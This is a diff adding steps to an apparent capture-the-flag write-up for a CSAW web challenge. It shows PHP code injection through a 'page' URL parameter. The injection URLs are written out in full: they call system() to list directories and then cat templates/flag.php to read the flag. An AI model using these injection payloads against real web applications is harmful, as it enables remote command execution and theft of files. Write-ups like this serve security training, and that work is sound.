@@ -87,3 +87,27 @@ Next we pulled up the phpinfo page by injecting by typing in the following comma
 Which retrieved all of the information and configuration of the website:
 
 ![screen shot](https://cloud.githubusercontent.com/assets/22091364/18820566/aebaa8c0-836c-11e6-949e-5bfa89b3cade.jpg)
+
+Success! we have injected the phpinfo(); command into the script sources on the live web page.
+
+---
+
+We then tried the `system()` call to launch commands on the machine and then We tried the `ls` command to list the directory contents with `view-source:http://web.chal.csaw.io:8000/?page=home%27).%20system(%22ls%20-lah%22);%20//`:
+
+![screen shot](https://cloud.githubusercontent.com/assets/22091364/18804401/47677144-81c8-11e6-9b6a-e766fa952723.png)
+
+As we can see, the directory contains a .git/ folder, a templates/ folder and the index.php source.
+
+---
+
+We explored the templates/ folder by using `http://web.chal.csaw.io:8000/?page=home%27).%20system(%22ls%20-lah%20templates%22);%20//`:
+
+![screen shot](https://cloud.githubusercontent.com/assets/22091364/18804405/477075b4-81c8-11e6-9405-21acd8aee0db.png)
+
+Within this directory we saw flag.php. We examined flag.php next.
+
+---
+
+Lastly, we used the cat command to print out the flag.php contents. We were still in the home directory, so we used the relative path `templates/flag.php` through `http://web.chal.csaw.io:8000/?page=home%27).%20system("cat%20templates/flag.php")%20//`:
+
+![screen shot](https://cloud.githubusercontent.com/assets/22091364/18804402/4769ba94-81c8-11e6-988d-3f066bad6cc6.png)
